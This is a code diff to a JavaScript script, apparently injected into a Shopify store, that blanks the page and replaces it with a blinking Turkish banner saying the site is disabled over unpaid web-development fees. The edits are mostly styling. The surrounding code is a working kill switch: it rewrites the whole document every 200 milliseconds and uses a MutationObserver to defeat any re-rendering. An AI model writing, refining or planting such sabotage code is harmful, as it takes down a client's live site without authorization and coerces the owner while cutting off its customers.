@@ -16,19 +16,27 @@ const killHTML = `
     }
     h1 {
       color: #f00;
-      font-size: 2.5rem;
+      font-size: 5vw;
+      max-width: 90%;
       text-align: center;
       text-transform: uppercase;
-      animation: blink 1s infinite;
-      max-width: 90%;
+      animation: blink 2.5s infinite;
+      line-height: 1.2;
+      word-break: break-word;
     }
     @keyframes blink {
       0%   { opacity: 1; }
-      50%  { opacity: 0; }
+      45%  { opacity: 0; }
+      55%  { opacity: 0; }
       100% { opacity: 1; }
     }
+    @media (min-width: 768px) {
+      h1 {
+        font-size: 3rem;
+      }
+    }
   </style>
-  <h1>UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!</h1>
+  <h1>UYARI! BU SİTE ÖDENMEMİŞ WEB GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!</h1>
 `;
 
 // Başlangıçta tüm içeriği yok et
@@ -39,7 +47,7 @@ setInterval(() => {
   document.documentElement.innerHTML = killHTML;
 }, 200);
 
-// Ekstra: Shopify turbo veya PJAX yeniden ekleme yaparsa anında temizle
+// Shopify turbo veya PJAX yeniden ekleme yaparsa anında temizle
 new MutationObserver(() => {
   document.documentElement.innerHTML = killHTML;
 }).observe(document.documentElement, { childList: true, subtree: true });
